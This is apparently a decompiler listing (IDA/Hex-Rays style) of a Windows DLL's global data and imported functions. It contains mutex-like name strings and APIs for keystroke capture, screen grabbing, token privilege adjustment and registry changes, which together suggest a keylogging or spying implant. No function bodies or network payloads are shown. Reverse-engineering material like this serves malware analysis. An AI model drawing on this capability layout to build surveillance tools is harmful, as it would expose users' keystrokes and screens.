char aLocalfree[10] = "LocalFree"; // weak
WCHAR pszFmt[] = L"Session\\%d\\TH_POOL_SHD_MTX_FSW95XQ_TEST"; // idb
WCHAR String2[] = L"Global"; // idb
WCHAR aSessionD[] = L"Session\\%d"; // idb
WCHAR aSThPoolShdMtxF[] = L"%s\\TH_POOL_SHD_MTX_FSW95XQ_%d"; // idb
WCHAR asc_100B7B8C[] = L"\\"; // idb
WCHAR aSThPoolShdPqoi[] = L"%s\\TH_POOL_SHD_PQOISNG_%dSYNCMTX"; // idb
WCHAR aMsvcrtDll[] = L"msvcrt.dll"; // idb
CHAR aAdvapi32Dll_0[] = "advapi32.dll"; // idb
CHAR aConvertstrings_1[] = "ConvertStringSecurityDescriptorToSecurityDescriptorW"; // idb
WCHAR aShell32Dll[] = L"shell32.dll"; // idb
_UNKNOWN unk_100B7C4C; // weak
_UNKNOWN unk_100B7C7C; // weak
_UNKNOWN unk_100B7CB0; // weak
_UNKNOWN unk_100B7CE0; // weak
_UNKNOWN unk_100B7D10; // weak
_UNKNOWN unk_100B7D40; // weak
_UNKNOWN unk_100B7D70; // weak
wchar_t word_100B7DA0[2] = { 0u, 0u }; // weak
wchar_t aD[3] = L"%d"; // weak
_UNKNOWN unk_100B7DAC; // weak
_UNKNOWN unk_100B7DE6; // weak
_UNKNOWN unk_100B7DE7; // weak
wchar_t word_100B7DE8 = 0u; // weak
_UNKNOWN unk_100B7DEA; // weak
_UNKNOWN unk_100B7DEB; // weak
wchar_t word_100B7DEC = 0u; // weak
_UNKNOWN unk_100B7DEE; // weak
int dword_100B7DF0 = 0; // weak
int dword_100B7DF4 = 0; // weak
int dword_100B7DF8 = 0; // weak
WCHAR ModuleName[] = L"kernel32.dll"; // idb
CHAR ProcName[] = "GetProductInfo"; // idb
_UNKNOWN unk_100B7E70; // weak
wchar_t word_100B7EAC[2] = { 0u, 0u }; // weak
_UNKNOWN unk_100B7EB0; // weak
_UNKNOWN unk_100B7EF8; // weak
_UNKNOWN unk_100B7F4A; // weak
_UNKNOWN unk_100B7F4B; // weak
_UNKNOWN unk_100B7F4C; // weak
_UNKNOWN unk_100B7F88; // weak
_UNKNOWN unk_100B7FC8; // weak
_UNKNOWN unk_100B8010; // weak
wchar_t word_100B8064 = 0u; // weak
_UNKNOWN unk_100B8066; // weak
_UNKNOWN unk_100B8067; // weak
_UNKNOWN unk_100B8068; // weak
_UNKNOWN unk_100B80B4; // weak
_UNKNOWN unk_100B80EA; // weak
_UNKNOWN unk_100B80EC; // weak
_UNKNOWN unk_100B8124; // weak
_UNKNOWN unk_100B8164; // weak
wchar_t word_100B819C[2] = { 0u, 0u }; // weak
_UNKNOWN unk_100B81A0; // weak
_UNKNOWN unk_100B8208; // weak
_UNKNOWN unk_100B8283; // weak
_UNKNOWN unk_100B8284; // weak
_UNKNOWN unk_100B82BA; // weak
_UNKNOWN unk_100B82BB; // weak
wchar_t word_100B82BC = 0u; // weak
_UNKNOWN unk_100B82BE; // weak
_UNKNOWN unk_100B82BF; // weak
_UNKNOWN unk_100B82C0; // weak
wchar_t aNtdllDll[10] = L"ntdll.dll"; // weak
wchar_t word_100B832C[2] = { 0u, 0u }; // weak
wchar_t a08x[5] = L"%08X"; // weak
wchar_t word_100B833C[2] = { 0u, 0u }; // weak
wchar_t aD_0[3] = L"%d"; // weak
wchar_t word_100B8348[2] = { 0u, 0u }; // weak
_UNKNOWN unk_100B834C; // weak
_UNKNOWN unk_100B8380; // weak
_UNKNOWN unk_100B83C8; // weak
wchar_t a5[2] = L"5"; // weak
_UNKNOWN unk_100B8410; // weak
_UNKNOWN unk_100B8450; // weak
wchar_t a8[2] = L"8"; // weak
_UNKNOWN unk_100B8498; // weak
_UNKNOWN unk_100B84D8; // weak
_UNKNOWN unk_100B8524; // weak
_UNKNOWN unk_100B8560; // weak
_UNKNOWN unk_100B85A8; // weak
_UNKNOWN unk_100B85EC; // weak
_UNKNOWN unk_100B8624; // weak
_UNKNOWN unk_100B8658; // weak
_UNKNOWN unk_100B8694; // weak
_UNKNOWN unk_100B86D4; // weak
_UNKNOWN unk_100B870F; // weak
_UNKNOWN unk_100B8710; // weak
_UNKNOWN unk_100B8748; // weak
_UNKNOWN unk_100B8782; // weak
_UNKNOWN unk_100B8783; // weak
_UNKNOWN unk_100B8784; // weak
_UNKNOWN unk_100B87BC; // weak
_UNKNOWN unk_100B87F8; // weak
_UNKNOWN unk_100B8842; // weak
_UNKNOWN unk_100B8843; // weak
_UNKNOWN unk_100B8844; // weak
wchar_t word_100B8884[2] = { 0u, 0u }; // weak
_UNKNOWN unk_100B8888; // weak
_UNKNOWN unk_100B88C8; // weak
wchar_t word_100B890C[2] = { 0u, 0u }; // weak
_UNKNOWN unk_100B8910; // weak
_UNKNOWN unk_100B8950; // weak
_UNKNOWN unk_100B8994; // weak
wchar_t word_100B89D4[2] = { 0u, 0u }; // weak
_UNKNOWN unk_100B89D8; // weak
_UNKNOWN unk_100B8A34; // weak
_UNKNOWN unk_100B8A74; // weak
_UNKNOWN unk_100B8AB0; // weak
_UNKNOWN unk_100B8B08; // weak
_UNKNOWN unk_100B8B48; // weak
_UNKNOWN unk_100B8B90; // weak
_UNKNOWN unk_100B8BD4; // weak
_UNKNOWN unk_100B8C08; // weak
_UNKNOWN unk_100B8C48; // weak
_UNKNOWN unk_100B8C88; // weak
_UNKNOWN unk_100B8CF0; // weak
_UNKNOWN unk_100B8D30; // weak
_UNKNOWN unk_100B8D80; // weak
_UNKNOWN unk_100B8DD0; // weak
wchar_t word_100B8E3C[2] = { 0u, 0u }; // weak
_UNKNOWN unk_100B8E40; // weak
_UNKNOWN unk_100B8E94; // weak
_UNKNOWN unk_100B8ED0; // weak
int dword_100B8F1C = 0; // weak
_UNKNOWN unk_100B8F20; // weak
_UNKNOWN unk_100B8F60; // weak
_UNKNOWN unk_100B8FB4; // weak
_UNKNOWN unk_100B8FE8; // weak
_UNKNOWN unk_100B9030; // weak
_UNKNOWN unk_100B9090; // weak
_UNKNOWN unk_100B90D8; // weak
wchar_t word_100B911C[2] = { 0u, 0u }; // weak
_UNKNOWN unk_100B9120; // weak
_UNKNOWN unk_100B9178; // weak
_UNKNOWN unk_100B91D8; // weak
_UNKNOWN unk_100B9234; // weak
_UNKNOWN unk_100B926C; // weak
_UNKNOWN unk_100B92B0; // weak
_UNKNOWN unk_100B92FC; // weak
_UNKNOWN unk_100B9338; // weak
_UNKNOWN unk_100B9378; // weak
_UNKNOWN unk_100B93B8; // weak
_UNKNOWN unk_100B93F8; // weak
_UNKNOWN unk_100B9430; // weak
_UNKNOWN unk_100B9468; // weak
_UNKNOWN unk_100B94A8; // weak
_UNKNOWN unk_100B94E8; // weak
_UNKNOWN unk_100B9528; // weak
_UNKNOWN unk_100B9568; // weak
_UNKNOWN unk_100B95A8; // weak
_UNKNOWN unk_100B95E0; // weak
_UNKNOWN unk_100B961C; // weak
_UNKNOWN unk_100B9658; // weak
_UNKNOWN unk_100B9694; // weak
_UNKNOWN unk_100B96D0; // weak
_UNKNOWN unk_100B9708; // weak
_UNKNOWN unk_100B9740; // weak
_UNKNOWN unk_100B9788; // weak
_UNKNOWN unk_100B97D0; // weak
_UNKNOWN unk_100B9810; // weak
_UNKNOWN unk_100B9850; // weak
_UNKNOWN unk_100B9890; // weak
_UNKNOWN unk_100B98D4; // weak
_UNKNOWN unk_100B9910; // weak
_UNKNOWN unk_100B9948; // weak
_UNKNOWN unk_100B9980; // weak
_UNKNOWN unk_100B99C0; // weak
_UNKNOWN unk_100B9A00; // weak
_UNKNOWN unk_100B9A40; // weak
_UNKNOWN unk_100B9A80; // weak
_UNKNOWN unk_100B9ABC; // weak
_UNKNOWN unk_100B9AF8; // weak
_UNKNOWN unk_100B9B38; // weak
_UNKNOWN unk_100B9B80; // weak
_UNKNOWN unk_100B9BE0; // weak
_UNKNOWN unk_100B9C40; // weak
_UNKNOWN unk_100B9C8C; // weak
_UNKNOWN unk_100B9CC8; // weak
_UNKNOWN unk_100B9D00; // weak
_UNKNOWN unk_100B9D40; // weak
_UNKNOWN unk_100B9D7C; // weak
_UNKNOWN unk_100B9DB4; // weak
_UNKNOWN unk_100B9DF4; // weak
_UNKNOWN unk_100B9E30; // weak
_UNKNOWN unk_100B9E78; // weak
_UNKNOWN unk_100B9EC0; // weak
_UNKNOWN unk_100B9F08; // weak
_UNKNOWN unk_100B9F50; // weak
_UNKNOWN unk_100B9FB0; // weak
_UNKNOWN unk_100BA000; // weak
_UNKNOWN unk_100BA048; // weak
_UNKNOWN unk_100BA0A8; // weak
_UNKNOWN unk_100BA100; // weak
_UNKNOWN unk_100BA140; // weak
_UNKNOWN unk_100BA17C; // weak
_UNKNOWN unk_100BA1B8; // weak
_UNKNOWN unk_100BA1F8; // weak
_UNKNOWN unk_100BA234; // weak
_UNKNOWN unk_100BA26C; // weak
_UNKNOWN unk_100BA2A0; // weak
_UNKNOWN unk_100BA2D8; // weak
_UNKNOWN unk_100BA320; // weak
_UNKNOWN unk_100BA368; // weak
_UNKNOWN unk_100BA3CC; // weak
_UNKNOWN unk_100BA408; // weak
_UNKNOWN unk_100BA468; // weak
_UNKNOWN unk_100BA4C0; // weak
_UNKNOWN unk_100BA500; // weak
_UNKNOWN unk_100BA550; // weak
_UNKNOWN unk_100BA588; // weak
_UNKNOWN unk_100BA5C4; // weak
_UNKNOWN unk_100BA604; // weak
_UNKNOWN unk_100BA640; // weak
_UNKNOWN unk_100BA680; // weak
_UNKNOWN unk_100BA6E8; // weak
_UNKNOWN unk_100BA738; // weak
_UNKNOWN unk_100BA784; // weak
_UNKNOWN unk_100BA7C0; // weak
_UNKNOWN unk_100BA800; // weak
_UNKNOWN unk_100BA840; // weak
_UNKNOWN unk_100BA87C; // weak
_UNKNOWN unk_100BA8B8; // weak
_UNKNOWN unk_100BA8F8; // weak
_UNKNOWN unk_100BA93C; // weak
_UNKNOWN unk_100BA97C; // weak
_UNKNOWN unk_100BA9B8; // weak
_UNKNOWN unk_100BA9F8; // weak
_UNKNOWN unk_100BAA38; // weak
_UNKNOWN unk_100BAA78; // weak
_UNKNOWN unk_100BAAB8; // weak
_UNKNOWN unk_100BAAF4; // weak
_UNKNOWN unk_100BAB30; // weak
_UNKNOWN unk_100BAB70; // weak
_UNKNOWN unk_100BABB0; // weak
_UNKNOWN unk_100BAC00; // weak
_UNKNOWN unk_100BAC40; // weak
_UNKNOWN unk_100BAC84; // weak
_UNKNOWN unk_100BACC0; // weak
_UNKNOWN unk_100BAD0C; // weak
_UNKNOWN unk_100BAD4C; // weak
_UNKNOWN unk_100BAD88; // weak
_UNKNOWN unk_100BADD0; // weak
_UNKNOWN unk_100BAE14; // weak
_UNKNOWN unk_100BAE58; // weak
_UNKNOWN unk_100BAEA0; // weak
_UNKNOWN unk_100BAEE8; // weak
_UNKNOWN unk_100BAF28; // weak
_UNKNOWN unk_100BAF64; // weak
_UNKNOWN unk_100BAFA0; // weak
_UNKNOWN unk_100BAFE0; // weak
_UNKNOWN unk_100BB020; // weak
_UNKNOWN unk_100BB074; // weak
_UNKNOWN unk_100BB0B8; // weak
_UNKNOWN unk_100BB104; // weak
_UNKNOWN unk_100BB140; // weak
_UNKNOWN unk_100BB184; // weak
_UNKNOWN unk_100BB1C0; // weak
_UNKNOWN unk_100BB200; // weak
_UNKNOWN unk_100BB23C; // weak
_UNKNOWN unk_100BB274; // weak
_UNKNOWN unk_100BB2B4; // weak
_UNKNOWN unk_100BB2F0; // weak
_UNKNOWN unk_100BB330; // weak
_UNKNOWN unk_100BB36C; // weak
_UNKNOWN unk_100BB3A8; // weak
_UNKNOWN unk_100BB3E4; // weak
_UNKNOWN unk_100BB41C; // weak
_UNKNOWN unk_100BB458; // weak
_UNKNOWN unk_100BB490; // weak
_UNKNOWN unk_100BB4CC; // weak
_UNKNOWN unk_100BB508; // weak
_UNKNOWN unk_100BB548; // weak
_UNKNOWN unk_100BB588; // weak
_UNKNOWN unk_100BB5C8; // weak
_UNKNOWN unk_100BB608; // weak
_UNKNOWN unk_100BB644; // weak
_UNKNOWN unk_100BB680; // weak
_UNKNOWN unk_100BB6C0; // weak
_UNKNOWN unk_100BB6FC; // weak
_UNKNOWN unk_100BB738; // weak
_UNKNOWN unk_100BB784; // weak
_UNKNOWN unk_100BB7C0; // weak
_UNKNOWN unk_100BB800; // weak
_UNKNOWN unk_100BB840; // weak
_UNKNOWN unk_100BB87C; // weak
_UNKNOWN unk_100BB8B8; // weak
_UNKNOWN unk_100BB900; // weak
_UNKNOWN unk_100BB938; // weak
_UNKNOWN unk_100BB978; // weak
_UNKNOWN unk_100BB9B4; // weak
_UNKNOWN unk_100BB9F4; // weak
_UNKNOWN unk_100BBA30; // weak
_UNKNOWN unk_100BBA70; // weak
_UNKNOWN unk_100BBAB0; // weak
_UNKNOWN unk_100BBAF0; // weak
_UNKNOWN unk_100BBB2C; // weak
_UNKNOWN unk_100BBB68; // weak
_UNKNOWN unk_100BBBA0; // weak
int dword_100BBBE0 = 33; // weak
_DWORD dword_100BBBE4[2] = { 0, 0 }; // weak
_DWORD dword_100BBBEC[2] = { 0, 0 }; // weak
_DWORD dword_100BBBF4[2] = { 0, 0 }; // weak
_DWORD dword_100BBBFC[2] = { 0, 0 }; // weak
int dword_100BBC04 = 0; // weak
int dword_100BBC08 = 0; // weak
int dword_100BBC0C = 33; // weak
_DWORD dword_100BBC10[2] = { 0, 0 }; // weak
_DWORD dword_100BBC18[2] = { 0, 0 }; // weak
_DWORD dword_100BBC20[2] = { 0, 0 }; // weak
_DWORD dword_100BBC28[2] = { 0, 0 }; // weak
int dword_100BBC30 = 0; // weak
int dword_100BBC34 = 0; // weak
char *dword_100BBC38 = NULL; // idb
char *dword_100BBC3C = NULL; // idb
int dword_100BBC40 = 0; // weak
LPVOID Environment = NULL; // idb
wchar_t word_100BBCC4[2] = { 0u, 0u }; // weak
int dword_100BBCC8 = 0; // weak
int dword_100BBCF8 = 0; // weak
int dword_100BBD44 = 0; // weak
int dword_100BBFBC = 0; // weak
char aStreamError[13] = "stream error"; // weak
char aInsufficientMe[20] = "insufficient memory"; // weak
char aBufferError[13] = "buffer error"; // weak
void *off_100BC568 = &unk_100923B8; // weak
void *off_100BC57C = &unk_10092838; // weak
_UNKNOWN unk_100BC590; // weak
_DWORD dword_100BC5A4[3] = { 120000, 1800000, 0 }; // weak
_DWORD dword_100BC5B0[4] = { 0, 0, 0, 0 }; // weak
_DWORD dword_100BC5C0[4] = { 0, 0, 0, 0 }; // weak
int dword_100BC5D0 = 31; // weak
_DWORD dword_100BC5D4[2] = { 0, 0 }; // weak
_DWORD dword_100BC5DC[2] = { 0, 0 }; // weak
_DWORD dword_100BC5E4[2] = { 0, 0 }; // weak
_DWORD dword_100BC5EC[2] = { 0, 0 }; // weak
int dword_100BC5F4 = 32; // weak
_DWORD dword_100BC5F8[2] = { 0, 0 }; // weak
_DWORD dword_100BC600[2] = { 0, 0 }; // weak
_DWORD dword_100BC608[2] = { 0, 0 }; // weak
_DWORD dword_100BC610[2] = { 0, 0 }; // weak
_DWORD dword_100BC61C[2] = { 0, 0 }; // weak
_DWORD dword_100BC624[2] = { 0, 0 }; // weak
_DWORD dword_100BC62C[2] = { 0, 0 }; // weak
_DWORD dword_100BC634[2] = { 0, 0 }; // weak
int (__stdcall *dword_100BC71C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_100BC720)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_100BC724)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_100BC728)(_DWORD) = NULL; // weak
int (__cdecl *dword_100BC72C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__thiscall **off_100BC730)(void *Block, char) = &off_1009300C; // weak
int dword_100BC734 = 0; // weak
int (__thiscall **off_100BC738)(void *Block, char) = &off_100933DC; // weak
int dword_100BC73C = 0; // weak
int (__thiscall **off_100BC740)(void *Block, char) = &off_10093918; // weak
int dword_100BC744 = 0; // weak
int (__thiscall **off_100BC748)(void *Block, char) = &off_10093D04; // weak
int dword_100BC74C = 0; // weak
// extern LSTATUS (__stdcall *RegQueryValueExW)(HKEY hKey, LPCWSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern BOOL (__stdcall *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// extern BOOL (__stdcall *GetSecurityDescriptorSacl)(PSECURITY_DESCRIPTOR pSecurityDescriptor, LPBOOL lpbSaclPresent, PACL *pSacl, LPBOOL lpbSaclDefaulted);
// extern BOOL (__stdcall *CreateProcessAsUserW)(HANDLE hToken, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern DWORD (__stdcall *SetNamedSecurityInfoW)(LPWSTR pObjectName, SE_OBJECT_TYPE ObjectType, SECURITY_INFORMATION SecurityInfo, PSID psidOwner, PSID psidGroup, PACL pDacl, PACL pSacl);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern LSTATUS (__stdcall *RegOpenKeyExW)(HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// extern BOOL (__stdcall *OpenThreadToken)(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle);
// extern BOOL (__stdcall *GetTokenInformation)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
// extern BOOL (__stdcall *LookupPrivilegeValueW)(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);
// extern BOOL (__stdcall *AdjustTokenPrivileges)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
// extern LSTATUS (__stdcall *RegCreateKeyExW)(HKEY hKey, LPCWSTR lpSubKey, DWORD Reserved, LPWSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
// extern BOOL (__stdcall *LookupAccountSidW)(LPCWSTR lpSystemName, PSID Sid, LPWSTR Name, LPDWORD cchName, LPWSTR ReferencedDomainName, LPDWORD cchReferencedDomainName, PSID_NAME_USE peUse);
// extern BOOL (__stdcall *RevertToSelf)();
// extern LSTATUS (__stdcall *RegEnumKeyExW)(HKEY hKey, DWORD dwIndex, LPWSTR lpName, LPDWORD lpcchName, LPDWORD lpReserved, LPWSTR lpClass, LPDWORD lpcchClass, PFILETIME lpftLastWriteTime);
// extern LSTATUS (__stdcall *RegEnumValueW)(HKEY hKey, DWORD dwIndex, LPWSTR lpValueName, LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern LSTATUS (__stdcall *RegSetValueExW)(HKEY hKey, LPCWSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern LSTATUS (__stdcall *RegOpenCurrentUser)(REGSAM samDesired, PHKEY phkResult);
// extern LSTATUS (__stdcall *RegDeleteValueW)(HKEY hKey, LPCWSTR lpValueName);
// extern LSTATUS (__stdcall *RegQueryInfoKeyA)(HKEY hKey, LPSTR lpClass, LPDWORD lpcchClass, LPDWORD lpReserved, LPDWORD lpcSubKeys, LPDWORD lpcbMaxSubKeyLen, LPDWORD lpcbMaxClassLen, LPDWORD lpcValues, LPDWORD lpcbMaxValueNameLen, LPDWORD lpcbMaxValueLen, LPDWORD lpcbSecurityDescriptor, PFILETIME lpftLastWriteTime);
// extern LSTATUS (__stdcall *RegDeleteKeyW)(HKEY hKey, LPCWSTR lpSubKey);
// extern BOOL (__stdcall *LogonUserW)(LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken);
// extern BOOL (__stdcall *DeleteDC)(HDC hdc);
// extern BOOL (__stdcall *DeleteObject)(HGDIOBJ ho);
// extern BOOL (__stdcall *BitBlt)(HDC hdc, int x, int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop);
// extern HBITMAP (__stdcall *CreateCompatibleBitmap)(HDC hdc, int cx, int cy);
// extern HDC (__stdcall *CreateCompatibleDC)(HDC hdc);
// extern HGDIOBJ (__stdcall *SelectObject)(HDC hdc, HGDIOBJ h);
// extern int (__stdcall *GetDIBits)(HDC hdc, HBITMAP hbm, UINT start, UINT cLines, LPVOID lpvBits, LPBITMAPINFO lpbmi, UINT usage);
// extern int (__stdcall *GetObjectA)(HANDLE h, int c, LPVOID pv);
// extern HRESULT (__stdcall *VariantClear)(VARIANTARG *pvarg);
// extern void (__stdcall *SysFreeString)(BSTR bstrString);
// extern void (__stdcall *VariantInit)(VARIANTARG *pvarg);
// extern UINT (__stdcall *SysStringByteLen)(BSTR bstr);
// extern BSTR (__stdcall *SysAllocStringByteLen)(LPCSTR psz, UINT len);
// extern HRESULT (__stdcall *VariantChangeType)(VARIANTARG *pvargDest, const VARIANTARG *pvarSrc, USHORT wFlags, VARTYPE vt);
// extern HRESULT (__stdcall *GetErrorInfo)(ULONG dwReserved, IErrorInfo **pperrinfo);
// extern HRESULT (__stdcall *CreateErrorInfo)(ICreateErrorInfo **pperrinfo);
// extern BSTR (__stdcall *SysAllocString)(const OLECHAR *psz);
// extern HRESULT (__stdcall *SetErrorInfo)(ULONG dwReserved, IErrorInfo *perrinfo);
// extern UINT (__stdcall *SysStringLen)(BSTR pbstr);
// extern BOOL (__stdcall *PathStripToRootW)(LPWSTR pszPath);
// extern int (*wnsprintfW)(PWSTR pszDest, int cchDest, PCWSTR pszFmt, ...);
// extern int (__stdcall *ReleaseDC)(HWND hWnd, HDC hDC);
// extern HWND (__stdcall *WindowFromDC)(HDC hDC);
// extern BOOL (__stdcall *PostThreadMessageA)(DWORD idThread, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern BOOL (__stdcall *SystemParametersInfoA)(UINT uiAction, UINT uiParam, PVOID pvParam, UINT fWinIni);
// extern BOOL (__stdcall *GetWindowRect)(HWND hWnd, LPRECT lpRect);
// extern BOOL (__stdcall *GetClientRect)(HWND hWnd, LPRECT lpRect);
// extern LRESULT (__stdcall *DispatchMessageA)(const MSG *lpMsg);
// extern BOOL (__stdcall *GetGUIThreadInfo)(DWORD idThread, PGUITHREADINFO pgui);
// extern int (__stdcall *GetWindowTextW)(HWND hWnd, LPWSTR lpString, int nMaxCount);
// extern int (__stdcall *GetDlgCtrlID)(HWND hWnd);
// extern UINT (__stdcall *MapVirtualKeyA)(UINT uCode, UINT uMapType);
// extern HWND (__stdcall *GetForegroundWindow)();
// extern BOOL (__stdcall *PeekMessageA)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg);
// extern HKL (__stdcall *GetKeyboardLayout)(DWORD idThread);
// extern HDC (__stdcall *GetDC)(HWND hWnd);
// extern DWORD (__stdcall *MsgWaitForMultipleObjects)(DWORD nCount, const HANDLE *pHandles, BOOL fWaitAll, DWORD dwMilliseconds, DWORD dwWakeMask);
// extern UINT (__stdcall *MapVirtualKeyExA)(UINT uCode, UINT uMapType, HKL dwhkl);
// extern DWORD (__stdcall *GetWindowThreadProcessId)(HWND hWnd, LPDWORD lpdwProcessId);
// extern int (__stdcall *ToUnicodeEx)(UINT wVirtKey, UINT wScanCode, const BYTE *lpKeyState, LPWSTR pwszBuff, int cchBuff, UINT wFlags, HKL dwhkl);
// extern SHORT (__stdcall *GetKeyState)(int nVirtKey);
// extern HWND (__stdcall *GetDesktopWindow)();
// extern BOOL (__stdcall *DestroyEnvironmentBlock)(LPVOID lpEnvironment);
// extern BOOL (__stdcall *CreateEnvironmentBlock)(LPVOID *lpEnvironment, HANDLE hToken, BOOL bInherit);
// extern BOOL (__stdcall *FindCloseUrlCache)(HANDLE hEnumHandle);
// extern HRESULT (__stdcall *CoCreateInstance)(const IID *const rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, const IID *const riid, LPVOID *ppv);
// extern void (__stdcall *CoUninitialize)();
// extern HRESULT (__stdcall *CoInitializeEx)(LPVOID pvReserved, DWORD dwCoInit);
// extern HRESULT (__stdcall *OleRun)(LPUNKNOWN pUnknown);
int dword_100BC8DC = 0; // weak
int (__stdcall *dword_100BC8E0)(_DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_100BC8E4)(_DWORD, _DWORD) = NULL; // weak
int dword_100BC8E8 = 0; // weak
int dword_100BC90C = 0; // weak
int dword_100BC934 = 0; // weak
int dword_100BC940 = 0; // weak
int dword_100BCC94 = 0; // weak
int dword_100BCDF0 = 0; // weak
int dword_100BD27C; // weak
LONG Target; // idb
int dword_100BD28C; // weak
int dword_100BD290; // weak
int dword_100BD294; // weak
int dword_100BD298; // weak
int dword_100BD29C; // weak
int dword_100BD2A0; // weak
int dword_100BD3D8; // weak
int dword_100BD3DC; // weak
int dword_100BD3E0; // weak
int dword_100BD3E4; // weak
int dword_100BD3E8; // weak
int dword_100BD3EC; // weak
int dword_100BD3F0; // weak
int dword_100BD3F4; // weak
char byte_100BD3F8; // weak
char byte_100BD3F9; // weak
char byte_100BD3FA; // weak
char byte_100BD3FB; // weak
void *Block; // idb
int dword_100BD400; // weak
int dword_100BD404; // weak
int dword_100BD408; // weak
int dword_100BD40C; // weak
char byte_100BD410[256]; // weak
_UNKNOWN unk_100BD510; // weak
int dword_100BE190; // weak
int dword_100BE194; // weak
char byte_100BE198[]; // weak
char byte_100BE19A[]; // weak
char byte_100BE19B; // weak
char byte_100BE19C[256]; // weak
int dword_100BE29C; // weak
char byte_100BE2A0[]; // weak
char byte_100BE2A1; // weak
_UNKNOWN unk_100BE2A2; // weak
_UNKNOWN unk_100BE2AB; // weak
int dword_100BE3A0; // weak
int dword_100BE3A4; // weak
_UNKNOWN unk_100BE3A8; // weak
int dword_100BEFA8; // weak
_UNKNOWN unk_100BEFAC; // weak
char byte_100BEFAF[]; // weak
char byte_100BEFB0[40]; // weak
int dword_100BEFD8; // weak
char byte_100BEFDF[]; // weak
unsigned __int8 byte_100BEFE0[128]; // weak
_DWORD dword_100BF064[2]; // weak
_DWORD dword_100BF06C[2]; // weak
int dword_100BF074[3]; // weak
_DWORD dword_100BF080[2]; // weak
_DWORD dword_100BF088[2]; // weak
_DWORD dword_100BF090[2]; // weak
_DWORD dword_100BF098[2]; // weak
_DWORD dword_100BF0A0[2]; // weak
_DWORD dword_100BF0A8[2]; // weak
_DWORD dword_100BF0B0[2]; // weak
_DWORD dword_100BF0B8[2]; // weak
_DWORD dword_100BF0C0[2]; // weak
_DWORD dword_100BF0C8[2]; // weak
_DWORD dword_100BF0D0[2]; // weak
_DWORD dword_100BF0D8[2]; // weak
_DWORD dword_100BF0E0[2]; // weak
_DWORD dword_100BF0E8[2]; // weak
_DWORD dword_100BF0F0[2]; // weak
_DWORD dword_100BF0F8[2]; // weak
_DWORD dword_100BF100[2]; // weak
_DWORD dword_100BF108[2]; // weak
_DWORD dword_100BF110[2]; // weak
_DWORD dword_100BF118[2]; // weak
_DWORD dword_100BF120[2]; // weak
_DWORD dword_100BF128[2]; // weak
_DWORD dword_100BF130[2]; // weak
_DWORD dword_100BF138[2]; // weak
_DWORD dword_100BF140[2]; // weak
_DWORD dword_100BF148[2]; // weak
_DWORD dword_100BF150[2]; // weak
_DWORD dword_100BF158[2]; // weak
_DWORD dword_100BF160[2]; // weak
_DWORD dword_100BF168[2]; // weak
_DWORD dword_100BF170[2]; // weak
_DWORD dword_100BF178[2]; // weak
_DWORD dword_100BF180[2]; // weak
_DWORD dword_100BF188[2]; // weak
_DWORD dword_100BF190[2]; // weak
_DWORD dword_100BF198[2]; // weak
_DWORD dword_100BF1A0[2]; // weak
_DWORD dword_100BF1A8[2]; // weak
_DWORD dword_100BF1B0[2]; // weak
_DWORD dword_100BF1B8[2]; // weak
_DWORD dword_100BF1C0[2]; // weak
_DWORD dword_100BF1C8[2]; // weak
_DWORD dword_100BF1D0[2]; // weak
_DWORD dword_100BF1D8[2]; // weak
_DWORD dword_100BF1E0[2]; // weak
_DWORD dword_100BF1E8[2]; // weak
_DWORD dword_100BF1F0[2]; // weak
_DWORD dword_100BF1F8[2]; // weak
_DWORD dword_100BF200[2]; // weak
_DWORD dword_100BF208[2]; // weak
_DWORD dword_100BF210[2]; // weak
_DWORD dword_100BF218[2]; // weak
_DWORD dword_100BF220[2]; // weak
_DWORD dword_100BF228[2]; // weak
_DWORD dword_100BF230[2]; // weak
_DWORD dword_100BF238[2]; // weak
_DWORD dword_100BF240[2]; // weak
_DWORD dword_100BF248[2]; // weak
_DWORD dword_100BF250[2]; // weak
_DWORD dword_100BF258[2]; // weak
_DWORD dword_100BF260[2]; // weak
_DWORD dword_100BF268[2]; // weak
_DWORD dword_100BF270[2]; // weak
_DWORD dword_100BF278[2]; // weak
_DWORD dword_100BF280[2]; // weak
_DWORD dword_100BF288[2]; // weak
_DWORD dword_100BF290[2]; // weak
_DWORD dword_100BF298[2]; // weak
_DWORD dword_100BF2A0[2]; // weak
